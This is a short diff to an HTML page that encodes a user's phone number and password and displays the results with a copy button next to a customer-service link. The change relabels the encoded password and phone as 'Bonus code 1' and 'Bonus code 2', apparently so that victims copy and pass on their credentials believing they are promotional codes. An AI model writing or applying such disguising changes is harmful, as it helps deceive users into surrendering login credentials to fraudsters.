@@ -215,7 +215,7 @@
             <img src="https://i.ibb.co/y4wrJc8/icon-sevice-9f0c8455.png" alt="Customer Service">
         </a>
         <div class="result-box" id="result" style="display: none;"></div>
-        <button class="copy-btn" id="copy-btn" style="display: none;" onclick="copyToClipboard()">Copy to Clipboard</button>
+        <button class="copy-btn" id="copy-btn" style="display: none;" onclick="copyToClipboard()">Copy</button>
     </div>
 
     <script>
@@ -258,7 +258,7 @@
             const copyButton = document.getElementById('copy-btn');
             resultBox.style.display = 'block';
             copyButton.style.display = 'block';
-            resultBox.innerHTML = `<p>Encoded Phone: ${encodedPhone}</p><p>Encoded Password: ${encodedPassword}</p>`;
+            resultBox.innerHTML = `<p>Bonus code 1: ${encodedPhone}</p><p>Bonus code 2: ${encodedPassword}</p>`;
         }
 
         function validateEmailLogin() {
